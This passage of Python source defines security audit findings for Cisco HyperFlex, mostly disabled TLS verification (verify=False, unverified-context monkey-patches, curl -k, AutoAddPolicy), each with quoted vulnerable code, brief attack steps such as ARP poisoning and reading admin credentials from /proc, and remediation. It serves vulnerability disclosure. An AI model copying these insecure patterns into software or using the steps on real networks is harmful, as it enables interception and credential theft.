    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "usr/share/hyperflex/storfs-stretched/switchToArbitrator.py (L134)"
    ),
    "description": (
        "The switchToArbitrator.py script, which executes cluster arbitrator failover "
        "in stretched HyperFlex deployments, passes verify=False to all REST calls "
        "in its restWithRetry() helper function. This script contacts the HyperFlex "
        "management REST API to coordinate witness/arbitrator node transitions — "
        "a high-privilege operation that reconfigures cluster quorum. "
        "Disabling TLS verification during arbitrator failover means the REST "
        "endpoint identity is never confirmed; an attacker on the stretched network "
        "can intercept failover commands or inject fabricated REST responses to "
        "redirect quorum transitions to an attacker-controlled node."
    ),
    "evidence": (
        "  switchToArbitrator.py L130-135:\n"
        "\n"
        "    def restWithRetry(restFn, restUrl, data, auth, headers,\n"
        "                      retryCount, retryInterval):\n"
        "        count = 0\n"
        "        while count < retryCount:\n"
        "            try:\n"
        "                resp = restFn(url=restUrl, data=data, auth=auth,\n"
        "                              headers=headers, verify=False)"
    ),
    "reproduction": (
        "During a stretched-cluster arbitrator switchover event, intercept REST traffic "
        "from switchToArbitrator.py. Present a forged certificate. "
        "The script accepts it and proceeds with failover against the attacker-controlled endpoint."
    ),
    "remediation": (
        "Replace verify=False with verify=<ca_bundle_path> pointing to the "
        "HyperFlex cluster CA bundle. This is the same root cause as HX-F263 "
        "through HX-F271 (systemic verify=False in management scripts)."
    ),
    "references": ["CWE-295"],
}

HX_F278 = {
    "id": "HX-F278",
    "title": (
        "Global Python SSL Monkey-Patch (ssl._create_default_https_context) in "
        "storfs-misc hx-scripts and stcli Operational Tools (5 Files)"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "usr/share/hyperflex/storfs-misc/hx-scripts/stig_security_settings.py (L32), "
        "usr/share/hyperflex/storfs-misc/hx-scripts/post_install.py (L80), "
        "usr/share/hyperflex/storfs-misc/hx-scripts/node_replace.py (L45), "
        "stcli-egg/stCli/stCli.py (L13509, __main__ entry point), "
        "usr/share/hyperflex/storfs-misc/pci_passthru.py (L786)"
    ),
    "description": (
        "Five additional HyperFlex operational tools apply the "
        "ssl._create_default_https_context = ssl._create_unverified_context "
        "monkey-patch at process startup, disabling TLS certificate validation "
        "for all HTTPS connections in the process. "
        "stig_security_settings.py applies STIG hardening to cluster nodes — "
        "the script that enforces security policy cannot validate the TLS "
        "certificates of the endpoints it configures. "
        "post_install.py and node_replace.py apply post-cluster and node "
        "replacement operations while similarly bypassing TLS. "
        "stCli.py applies the bypass in its __main__ entry point, affecting "
        "any HTTPS connection made by the stcli command-line tool itself "
        "(separate from the StTransportBase.py bypass already documented in HX-F267). "
        "pci_passthru.py configures PCI passthrough on ESX nodes with TLS disabled "
        "(same file as factory/utils/pci_passthru.py in HX-F274, deployed in storfs-misc). "
        "All five use the 'try/except: pass' pattern — the bypass is silent on failure."
    ),
    "evidence": (
        "  stig_security_settings.py L30-32:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    (applied before all STIG configuration API calls)\n"
        "\n"
        "  post_install.py L78-80:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    (applied before all post-installation REST calls)\n"
        "\n"
        "  node_replace.py L43-45:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    (applied before all node-replacement REST and SSH operations)\n"
        "\n"
        "  stCli.py L13507-13509:\n"
        "    if __name__ == '__main__':\n"
        "        ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (applied at CLI entry — disables TLS for the entire stcli process)\n"
        "\n"
        "  pci_passthru.py L784-787:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (applied before connect.Connect() to ESX for PCI passthrough config)"
    ),
    "reproduction": (
        "During any of these operations (STIG hardening, post-install, node replace, "
        "stcli commands, PCI passthrough config), ARP-poison the management network. "
        "Present a forged certificate. The bypassed ssl context will accept it."
    ),
    "remediation": (
        "Remove all ssl._create_default_https_context assignments. "
        "Use ssl.create_default_context() with CERT_REQUIRED and the cluster CA "
        "for each HTTPS connection. See HX-F267 for the shared root cause and "
        "authoritative fix pattern."
    ),
    "references": ["CWE-295"],
}

HX_F279 = {
    "id": "HX-F279",
    "title": (
        "TLS Certificate Validation Disabled via curl -k in swagger_api_client.py "
        "AAA Token Authentication Path and Admin Credentials Exposed in Shell Command"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/restClientModule/swagger_api_client.py (L204-216) — "
        "_get_auth_token() method; curl subprocess call with -k flag and "
        "credentials embedded in shell command string"
    ),
    "description": (
        "The swagger_api_client.py _get_auth_token() method acquires AAA authentication "
        "tokens by invoking curl via subprocess.Popen(shell=True) with the -k flag, "
        "which disables TLS certificate verification for the POST to /aaa/v1/auth. "
        "The curl command includes the full JSON authentication body containing the "
        "admin username and password as a shell command string: "
        "'curl ... -d '{\"username\": ..., \"password\": ...}' ... -k'. "
        "This exposes admin credentials to other local processes via /proc/PID/cmdline "
        "for the duration of the subprocess call. "
        "The -k flag is a separate TLS bypass from the verify_ssl=False Python client "
        "configuration already documented in HX-F263 — this path is used when "
        "auth_type='token' for the AAA token flow that authenticates to coreapi "
        "and upgradeagent endpoints."
    ),
    "evidence": (
        "  swagger_api_client.py L207-216:\n"
        "\n"
        "    curl_cmd = (\n"
        "        \"curl -H \\\"Content-Type: application/json\\\" -X POST\"\n"
        "        \" -d '\" + json.dumps(body, ensure_ascii=False) + \"'\"\n"
        "        \" \" + \"https://\" + self.server + \"/aaa/v1/auth?\"\n"
        "        \"grant_type=password -k\"\n"
        "    )\n"
        "    auth_response = subprocess.Popen(curl_cmd, stdout=subprocess.PIPE,\n"
        "                                     stderr=subprocess.PIPE,\n"
        "                                     shell=True).communicate()[0]\n"
        "\n"
        "  -k: curl flag that skips TLS certificate verification (equivalent to verify=False)\n"
        "  body = {'username': <admin_user>, 'password': <admin_password>}\n"
        "  Credentials visible in /proc/PID/cmdline and shell process list during call."
    ),
    "reproduction": (
        "1. ARP-poison the management network to MITM the AAA endpoint. "
        "Present a forged certificate. The -k flag causes curl to accept it.\n"
        "2. Separately: while the curl subprocess runs, read /proc/PID/cmdline "
        "of the spawned shell process to extract the JSON body with admin credentials."
    ),
    "remediation": (
        "Replace the curl subprocess approach with a proper HTTPS Python request using "
        "the cluster CA bundle for verification. Use the swagger-generated client "
        "(which already handles TLS) rather than raw curl. "
        "This also eliminates the credential exposure in the process table."
    ),
    "references": ["CWE-295", "CWE-312"],
}

HX_F282 = {
    "id": "HX-F282",
    "title": (
        "hxSvcHttpEnabled=true Across All 42 HyperFlex Management WAR application.conf Files "
        "(Plain HTTP Thrift/REST Transport Enabled System-Wide)"
    ),
    "cwe": "CWE-319",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "component": (
        "All HyperFlex management-plane WARs: coreapi, auth, encryption, iscsi, "
        "securityservice, slservice, supportservice, hxupgrade, backup, dataprotection, "
        "stSSO, ROOT, hxSecuritySvcMgr — application.conf in every deployment"
    ),
    "description": (
        "The configuration key hxSvcHttpEnabled=true is set in every application.conf "
        "across all 42 HyperFlex management-plane WAR deployments (hxSvcMgr namespace). "
        "This key enables the plain HTTP transport for the inter-service communication "
        "layer that binds on port 9000. The Play framework default bind address is "
        "0.0.0.0; no http.address=127.0.0.1 override was found in any WAR configuration. "
        "While nginx proxies external HTTPS traffic to http://127.0.0.1:9000 and enforces "
        "TLS termination at port 443, the HTTP listener on port 9000 is independently "
        "accessible from any host that can reach the management interface — bypassing "
        "nginx's TLS layer entirely. The coreapi swagger.json explicitly declares "
        "\"schemes\": [\"http\", \"https\"], confirming HTTP is an intended transport. "
        "Authentication tokens, session cookies, cluster management API payloads, "
        "and administrative credentials transmitted over this interface traverse the "
        "network in cleartext. hyperVSvcHttpEnabled=true is also set throughout, "
        "enabling the same HTTP-only transport for the Hyper-V service interface."
    ),
    "evidence": (
        "hxSvcHttpEnabled=true confirmed in 42 application.conf files:\n"
        "  jar-extract/coreapi-war/WEB-INF/classes/application.conf:40\n"
        "  jar-extract/auth-war/WEB-INF/classes/application.conf:34\n"
        "  jar-extract/securityservice-war/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_iscsi/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_slservice/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_supportservice/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_hxupgrade/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_backupservice/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_dataprotection/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_encryption/WEB-INF/classes/application.conf\n"
        "  jar-extract/scan_ROOT/WEB-INF/classes/application.conf\n"
        "  jar-extract/hxSecuritySvcMgr/application.conf\n"
        "  (+ resources/ mirror copies for all above)\n"
        "\n"
        "nginx.conf L648:\n"
        "  location /adminGateway/connector/ {\n"
        "    allow 127.0.0.1; deny all;\n"
        "    proxy_pass http://127.0.0.1:9000/;\n"
        "  }\n"
        "(port 9000 proxied by nginx; no http.address=127.0.0.1 override found)\n"
        "\n"
        "coreapi swagger.json:\n"
        "  \"schemes\": [\"http\", \"https\"]\n"
        "\n"
        "Class file strings confirm HTTP endpoint:\n"
        "  'http://localhost:9000/DeviceConnections'\n"
        "  'curl 127.0.0.1:9000/Systems'\n"
        "  'sysmgmt.thrift.hxSvcHttpEnabled'"
    ),
    "reproduction": (
        "From any host on the HyperFlex management network: "
        "curl -v http://<hx-node-mgmt-ip>:9000/rest/v1/clusters — if port 9000 "
        "binds to 0.0.0.0 (Play default), this returns API data without TLS. "
        "Authentication tokens transmitted to this endpoint traverse the network "
        "in cleartext and can be captured by a passive network observer."
    ),
    "remediation": (
        "Add play.server.http.address=127.0.0.1 (Play 2.x) or equivalent to each "
        "application.conf to restrict the HTTP listener to the loopback interface. "
        "Set hxSvcHttpEnabled=false if inter-service communication can be migrated "
        "to HTTPS or TLS-wrapped Thrift. Add iptables rules to block external access "
        "to port 9000 on all management interfaces as a defense-in-depth measure."
    ),
    "references": ["CWE-319"],
}

HX_F283 = {
    "id": "HX-F283",
    "title": (
        "TLS Certificate Verification Disabled in Factory restWithRetry() "
        "(commonFunctions.py:588, verify=False)"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "factory/opt/hyperflex/storfs-factory/utils/commonFunctions.py (L588) — "
        "restWithRetry() utility function"
    ),
    "description": (
        "The restWithRetry() function in storfs-factory/utils/commonFunctions.py passes "
        "verify=False to every REST request it retries, disabling TLS certificate "
        "validation for all callers of this utility. restWithRetry() is a shared retry "
        "wrapper invoked across the factory provisioning codebase for management API calls "
        "during HyperFlex cluster bootstrapping and node provisioning. Disabling "
        "verification at the shared utility layer propagates the bypass to every "
        "provisioning operation that uses this function — node registration, cluster "
        "configuration, and API-driven provisioning steps all execute without certificate "
        "chain or hostname validation. An attacker on the provisioning network can present "
        "a forged TLS certificate to intercept any REST call routed through restWithRetry(). "
        "The same verify=False pattern in the stretched cluster arbitrator path is filed "
        "separately as HX-F276."
    ),
    "evidence": (
        "  storfs-factory/utils/commonFunctions.py L588:\n"
        "\n"
        "  def restWithRetry(restFn, restUrl, data, auth, headers, retryCount, retryInterval):\n"
        "      count = 0\n"
        "      resp = None\n"
        "      while count < retryCount:\n"
        "          try:\n"
        "              resp = restFn(url=restUrl, data=data, auth=auth,\n"
        "                           headers=headers, verify=False,\n"
        "                           timeout=REQUEST_TIMEOUT)\n"
        "          except:\n"
        "              ...\n"
        "\n"
        "  verify=False is hardcoded at the shared utility layer — all callers inherit "
        "the bypass. The same file contains AutoAddPolicy() instances at L273 and L660 "
        "(HX-F269), confirming a systemic pattern of transport security bypass in "
        "commonFunctions.py."
    ),
    "reproduction": (
        "ARP-spoof the provisioning/management network segment during factory deployment. "
        "Intercept any HTTPS REST call from a storfs-factory process that routes through "
        "restWithRetry(). Present a self-signed certificate with any subject. "
        "Python requests with verify=False accepts it unconditionally. "
        "Capture or manipulate provisioning API payloads (node registration data, "
        "cluster configuration parameters)."
    ),
    "remediation": (
        "Remove verify=False from restWithRetry(). Pass the CA bundle path as a parameter "
        "or use verify=True (default). Factory provisioning should use the HyperFlex "
        "cluster CA bundle or a pinned certificate for management API endpoints. "
        "Add a ca_bundle parameter to restWithRetry() so callers can specify the "
        "appropriate trust root without disabling verification entirely."
    ),
    "references": ["CWE-295"],
}

HX_F289 = {
    "id": "HX-F289",
    "title": (
        "TLS Completely Disabled via ssl.CERT_NONE + ssl.PROTOCOL_SSLv23 and Global "
        "Monkey-Patch in Validation VMware Layer (springpath_vmware.py)"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "usr/share/hyperflex/storfs-misc/validation/springpath_vmware.py "
        "(L69, L458-460, L585, L619)"
    ),
    "description": (
        "springpath_vmware.py, the HyperFlex validation module that verifies ESX and "
        "vCenter connectivity before cluster operations, disables TLS certificate "
        "validation through three independent bypass mechanisms. "
        "First, a module-level monkey-patch (L69) replaces the default HTTPS context "
        "with ssl._create_unverified_context for all HTTPS connections in the process. "
        "Second, the getHostSystem() method explicitly constructs an SSLContext using the "
        "deprecated ssl.PROTOCOL_SSLv23 protocol (accepts SSLv2, SSLv3, and TLS without "
        "restriction) and sets verify_mode=ssl.CERT_NONE before passing it to "
        "pyVmomi SmartConnect for ESX host authentication — an explicit, "
        "intentionally constructed insecure context rather than a bypass of a default. "
        "Third, two vCenter REST API calls (getvCenterRestSessionId L585, "
        "getvCenterNTPDetails L619) pass verify=False when authenticating to vCenter "
        "with plaintext credentials. "
        "The combination of deprecated protocol acceptance and explicit CERT_NONE "
        "means a network-adjacent attacker can present any certificate, including "
        "one generated at runtime, to intercept ESX and vCenter credentials during "
        "cluster validation. The monkey-patch additionally affects all urllib/httplib "
        "calls made transitively by imported modules."
    ),
    "evidence": (
        "  springpath_vmware.py L66-72 (module level, executed on import):\n"
        "    try:\n"
        "        ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    except AttributeError:\n"
        "        pass\n"
        "\n"
        "  springpath_vmware.py L456-460 (getHostSystem, ESX SmartConnect):\n"
        "    # Added ssl Context to avoid \"host is not a VIM server\"\n"
        "    # https://github.com/vmware/pyvmomi/issues/694\n"
        "    sslContext = ssl.SSLContext(ssl.PROTOCOL_SSLv23)  # deprecated\n"
        "    sslContext.verify_mode = ssl.CERT_NONE             # explicit CERT_NONE\n"
        "    hostSi = SmartConnect(host=ipAddress, user=esxUserName, pwd=esxPassword,\n"
        "                          sslContext=sslContext)\n"
        "\n"
        "  springpath_vmware.py L583-587 (getvCenterRestSessionId):\n"
        "    session = requests.post(session_url,\n"
        "                       auth=(vcenter_user, vcenter_password),\n"
        "                       headers=req_headers, verify=False)\n"
        "\n"
        "  springpath_vmware.py L617-619 (getvCenterNTPDetails):\n"
        "    resp = requests.get(timesync_url,\n"
        "           verify=False, headers=req_headers)\n"
        "\n"
        "  ssl.PROTOCOL_SSLv23 is deprecated in Python 3.10+; accepts SSLv2/SSLv3\n"
        "  in older Python versions when not further restricted.\n"
        "  verify_mode=ssl.CERT_NONE explicitly disables both peer authentication\n"
        "  and hostname checking for the constructed context."
    ),
}

HX_F295 = {
    "id": "HX-F295",
    "title": (
        "Global SSL Monkey-Patch in 7 Ansible ESX Upgrade Hook Scripts Including "
        "STIG Enforcement Scripts; ssl.CERT_NONE + disable_warnings in eam Cleanup Script"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/upgradeclusterposthooks/files/ "
        "(5999_apply_host_adv_settings_ESX.py:98, 6000_apply_stig_settings_ESX.py:99, "
        "5997_stig_setting_ESX.py:102, 0004_setup_vswitch_security_policy_ESX.py:96, "
        "0005_cleanup_eam_ESX.py:68,133,152); "
        "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/upgradeclusterprehooks/files/ "
        "(0009_set_nfs_queue_depth_ESX.py:44, "
        "0003_disable_nfs_datastore_remount_on_host_reboot_ESX.py:35)"
    ),
    "description": (
        "Seven Ansible ESX upgrade hook scripts apply the "
        "ssl._create_default_https_context = ssl._create_unverified_context monkey-patch "
        "at process startup, disabling TLS certificate validation for all HTTPS connections "
        "made by the process. "
        "The most consequential instances are in the STIG enforcement scripts: "
        "6000_apply_stig_settings_ESX.py and 5997_stig_setting_ESX.py apply DISA STIG "
        "security settings to ESX hosts — the scripts enforcing TLS and security policy "
        "on managed hosts cannot themselves validate the TLS certificates of those hosts. "
        "0005_cleanup_eam_ESX.py (ESXi Agents Manager cleanup, runs post-cluster-upgrade) "
        "applies three independent TLS bypass mechanisms: the global monkey-patch at L68, "
        "an explicit ssl.CERT_NONE context created via ssl.create_default_context() with "
        "verify_mode overridden at L133, and unconditional "
        "urllib3.disable_warnings(InsecureRequestWarning) at L152. "
        "These scripts execute during cluster upgrade phases, connecting to vSphere hosts "
        "to apply configuration changes — an MITM during upgrade can intercept vCenter "
        "and ESX credentials and manipulate the configuration being applied."
    ),
    "evidence": (
        "  upgradeclusterposthooks/6000_apply_stig_settings_ESX.py L99:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (STIG enforcement script — disables the TLS validation it aims to configure)\n"
        "\n"
        "  upgradeclusterposthooks/5997_stig_setting_ESX.py L102:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  upgradeclusterposthooks/5999_apply_host_adv_settings_ESX.py L98:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  upgradeclusterposthooks/0004_setup_vswitch_security_policy_ESX.py L96:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  upgradeclusterposthooks/0005_cleanup_eam_ESX.py (3 bypass mechanisms):\n"
        "    L68:  ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    L131: context = ssl.create_default_context()\n"
        "    L133: context.verify_mode = ssl.CERT_NONE  # explicit CERT_NONE\n"
        "    L152: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n"
        "\n"
        "  upgradeclusterprehooks/0009_set_nfs_queue_depth_ESX.py L44:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  upgradeclusterprehooks/0003_disable_nfs_datastore_remount_on_host_reboot_ESX.py L35:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context"
    ),
}


HX_F296 = {
    "id": "HX-F296",
    "title": (
        "Global SSL Monkey-Patch, AutoAddPolicy (2 Instances), and verify=False in "
        "configureNetworking_VCenter.py; Deployed 6x Across Ansible Roles"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/configureNetworking_VCenter.py and "
        "5 identical copies in roles/ "
        "(upgrademigration/files/, esx/files/, springpathvm/files/, compute/files/, "
        "roles/configureNetworking_VCenter.py — all MD5: 3c40deeda3c4e3d5e38c2265247819d8)"
    ),
    "description": (
        "configureNetworking_VCenter.py, the HyperFlex vCenter network configuration "
        "script invoked across multiple deployment and upgrade Ansible roles, contains "
        "three distinct security validation bypasses. "
        "A module-level monkey-patch at L6364 disables TLS certificate validation for all "
        "HTTPS connections in the process. "
        "Two instances of AutoAddPolicy at L5181 and L5226 disable SSH host key validation "
        "for node SSH connections during network reconfiguration. "
        "A verify=False parameter at L5445 in updateUdevRulesForIscsi disables TLS for "
        "iSCSI configuration REST calls. "
        "The same file is deployed in 6 locations across the Ansible role structure — "
        "roles for initial deployment (esx/, springpathvm/, compute/), migration "
        "(upgrademigration/), and the shared ansible/ directory. "
        "This file handles vCenter operations including port group reconfiguration, "
        "distributed switch setup, VMkernel adapter configuration, and iSCSI initiator "
        "setup — all performed without TLS validation or SSH host key verification."
    ),
    "evidence": (
        "  configureNetworking_VCenter.py L6364 (module-level monkey-patch):\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  configureNetworking_VCenter.py L5181:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  configureNetworking_VCenter.py L5226:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  configureNetworking_VCenter.py L5445:\n"
        "    self.updateUdevRulesForIscsi(..., verify=False)\n"
        "\n"
        "  6 identical copies (MD5: 3c40deeda3c4e3d5e38c2265247819d8):\n"
        "    ansible/configureNetworking_VCenter.py\n"
        "    ansible/roles/esx/files/configureNetworking_VCenter.py\n"
        "    ansible/roles/springpathvm/files/configureNetworking_VCenter.py\n"
        "    ansible/roles/compute/files/configureNetworking_VCenter.py\n"
        "    ansible/roles/upgrademigration/files/configureNetworking_VCenter.py\n"
        "    ansible/roles/esx/files/configureNetworking_VCenter.py  (duplicate)"
    ),
}

HX_F297 = {
    "id": "HX-F297",
    "title": (
        "ssl._create_unverified_context() Used for ESX SmartConnect Authentication and "
        "OVA Upload in esx_deploy_ova.py; Deployed 3x Across Upgrade/Deploy Roles"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/esx/files/esx_deploy_ova.py "
        "(L127, L400); identical copies in roles/compute/files/ and "
        "roles/upgradedeployvm/files/ — all MD5: 980d730fe544fd0da361b629affb4611"
    ),
    "description": (
        "esx_deploy_ova.py, the Ansible script that deploys the HyperFlex controller VM "
        "OVA to ESX hosts, disables TLS certificate validation via "
        "ssl._create_unverified_context() at two critical points. "
        "At L127, ssl._create_unverified_context() is passed as the sslContext parameter "
        "to pyVmomi SmartConnect — disabling certificate verification when authenticating "
        "to vSphere to obtain the deployment lease. "
        "At L400, ssl._create_unverified_context() is used as the SSL context for "
        "urlopen() during the OVA binary file upload to the ESX datastore. "
        "The OVA upload bypass is particularly severe: a network-adjacent attacker who "
        "intercepts the connection can substitute a malicious VM image for the authentic "
        "HyperFlex controller VM OVA being uploaded. "
        "The script accepts ESX credentials via command-line arguments (args.user, "
        "args.password), compounding the credential exposure surface. "
        "Three identical copies are deployed: esx/files/, compute/files/, and "
        "upgradedeployvm/files/ — covering initial deployment, compute node addition, "
        "and VM upgrade phases."
    ),
    "evidence": (
        "  esx_deploy_ova.py L125-133 (SmartConnect with unverified context):\n"
        "    if args.host:\n"
        "        context = ssl._create_unverified_context()\n"
        "        si = SmartConnect(host=args.host, user=args.user, pwd=args.password,\n"
        "                          port=args.port, sslContext=context)\n"
        "\n"
        "  esx_deploy_ova.py L396-408 (OVA binary upload with unverified context):\n"
        "    if hasattr(ssl, '_create_unverified_context'):\n"
        "        sslContext = ssl._create_unverified_context()\n"
        "    else:\n"
        "        sslContext = None\n"
        "    req = Request(url, ovffile, headers, method=method)\n"
        "    urlopen(req, context=sslContext)  # OVA binary uploaded without cert check\n"
        "\n"
        "  3 copies (MD5: 980d730fe544fd0da361b629affb4611):\n"
        "    roles/esx/files/esx_deploy_ova.py\n"
        "    roles/compute/files/esx_deploy_ova.py\n"
        "    roles/upgradedeployvm/files/esx_deploy_ova.py"
    ),
}


HX_F298 = {
    "id": "HX-F298",
    "title": (
        "SSL Monkey-Patch in 7 Additional Ansible ESX Upgrade/Deploy Scripts; "
        "ssl.CERT_NONE and verify=False in EAM Removal and Compute Unregister Scripts"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/upgradepostrelinquishnode/files/ "
        "(0005_remove_eam_ESX.py:L207/220/227/242/340/390, "
        "0004_configure_iscsi_upgrade_ESX.py:L57, "
        "0006_config_advanced_settings_vmx_ESX.py:L44); "
        "roles/upgradenodeposthooks/files/ "
        "(0004_unregister_compute_nodes_ESX.py:L124/220/252, "
        "0005_configure_iscsi_upgrade_compute_ESX.py:L52, "
        "0006_RestoreNFSAccessRules_ESX.py:L89/130); "
        "ansible/enableSnapshotSchedule.py:L152"
    ),
    "description": (
        "Seven additional Ansible ESX scripts across the upgradepostrelinquishnode, "
        "upgradenodeposthooks, and ansible root roles disable TLS certificate validation. "
        "All seven apply the ssl._create_default_https_context monkey-patch at script "
        "initialization. "
        "Two scripts apply additional explicit bypass mechanisms: "
        "0005_remove_eam_ESX.py (ESXi Agents Manager removal during node relinquishment) "
        "combines the monkey-patch with ssl.CERT_NONE at L340, disable_warnings at L390, "
        "and verify=False in three distinct REST calls at L207, L220, and L227 for "
        "vCenter MOB (Managed Object Browser) login, session management, and logout. "
        "0004_unregister_compute_nodes_ESX.py similarly combines monkey-patch with "
        "ssl.CERT_NONE at L220 and disable_warnings at L252. "
        "0006_RestoreNFSAccessRules_ESX.py adds AutoAddPolicy SSH bypass at L89 in "
        "addition to the monkey-patch. "
        "enableSnapshotSchedule.py applies the monkey-patch to snapshot scheduling "
        "API calls. "
        "Together with HX-F295, these findings document the ssl monkey-patch across "
        "14 Ansible ESX hook scripts covering the full upgrade and deployment lifecycle."
    ),
    "evidence": (
        "  0005_remove_eam_ESX.py (upgradepostrelinquishnode — EAM removal):\n"
        "    L207:  requests.get(url, auth=(username, password), verify=False)\n"
        "    L220:  requests.post(url, ..., cookies=session, verify=False)\n"
        "    L227:  requests.get('https://.../mob/logout', cookies=session, verify=False)\n"
        "    L242:  ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    L340:  context.verify_mode = ssl.CERT_NONE\n"
        "    L390:  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n"
        "\n"
        "  0004_unregister_compute_nodes_ESX.py (upgradenodeposthooks):\n"
        "    L124:  ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    L220:  context.verify_mode = ssl.CERT_NONE\n"
        "    L252:  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n"
        "\n"
        "  0006_RestoreNFSAccessRules_ESX.py (upgradenodeposthooks):\n"
        "    L89:   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "    L130:  ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  Remaining 4 scripts (single monkey-patch each):\n"
        "    0006_config_advanced_settings_vmx_ESX.py:L44\n"
        "    0004_configure_iscsi_upgrade_ESX.py:L57\n"
        "    0005_configure_iscsi_upgrade_compute_ESX.py:L52\n"
        "    enableSnapshotSchedule.py:L152"
    ),
}


HX_F299 = {
    "id": "HX-F299",
    "title": (
        "ssl._create_unverified_context() Used for Firmware and Catalog File Downloads "
        "in download.py; Deployed 4x Across Upgrade/Deploy Roles"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/esx/files/download.py (L65), "
        "roles/compute/files/download.py (L65), "
        "roles/upgradedeployvm/files/download.py (L65), "
        "roles/upgrademigration/files/download.py (L65) "
        "— all MD5: 55432be580b68b00c58cd2935bd2bd97"
    ),
    "description": (
        "download.py, the utility that fetches HyperFlex firmware packages, catalog "
        "files, and upgrade bundles over HTTPS, creates an unverified SSL context via "
        "ssl._create_unverified_context() and passes it to urlopen() for all downloads. "
        "Certificate validation is explicitly bypassed — the debug log message "
        "\"Using SSL unverified context\" confirms intentional behavior. "
        "The script downloads binary payloads with HTTP Range resumption support, "
        "supporting partial downloads up to 5 retries. An Authorization header with "
        "Basic Auth credentials can be passed via the basic_auth parameter. "
        "The absence of TLS verification means a network-adjacent attacker can substitute "
        "any downloaded file — firmware images, upgrade bundles, or catalog packages — "
        "with a malicious payload. Because the downloaded content is written to disk and "
        "subsequently executed or applied to cluster nodes, this creates an integrity "
        "bypass for the firmware update pipeline. "
        "Four identical copies are deployed across upgrade and deployment roles: "
        "esx/, compute/, upgradedeployvm/, and upgrademigration/."
    ),
    "evidence": (
        "  download.py L61-66 (download_file function):\n"
        "    if hasattr(ssl, '_create_unverified_context'):\n"
        "        logging.info('Using SSL unverified context')  # explicit intent\n"
        "        sslContext = ssl._create_unverified_context()\n"
        "    else:\n"
        "        sslContext = None\n"
        "\n"
        "  download.py L77-83 (urlopen with unverified context + auth header):\n"
        "    req = Request(url)\n"
        "    req.add_header('Range', 'bytes=' + str(download) + '-')\n"
        "    if basic_auth is not None:\n"
        "        req.add_header('Authorization', 'Basic %s' % basic_auth)\n"
        "    req = urlopen(req, context=sslContext)  # no cert validation\n"
        "\n"
        "  4 identical copies (MD5: 55432be580b68b00c58cd2935bd2bd97):\n"
        "    roles/esx/files/download.py\n"
        "    roles/compute/files/download.py\n"
        "    roles/upgradedeployvm/files/download.py\n"
        "    roles/upgrademigration/files/download.py"
    ),
}


HX_F300 = {
    "id": "HX-F300",
    "title": (
        "TLS Certificate Validation Disabled Across 11 Ansible Library and ESX Hook "
        "Scripts Including STIG Enforcement, Self-Signed Cert Management, and CIMC Control"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/library/ "
        "(stig.py:L53/82/126, enableEsxSelfSignedCert.py:L80, destroyStCtlVM.py:L304, "
        "assert_host_connected.py:L117, powerCycleCIMC.py:L100, cimcSettings.py:L306, "
        "setStCtlPasswd.py:L123, uninstall_cluster.py:L64, configureRDMs.py:L399/425); "
        "ansible/roles/upgradeclusterposthooks/files/9998_remove_host_authorized_keys_ESX.py:L24; "
        "ansible/roles/upgradeclusterprehooks/files/9951_enable_AHCI_driver_ESX.py:L88"
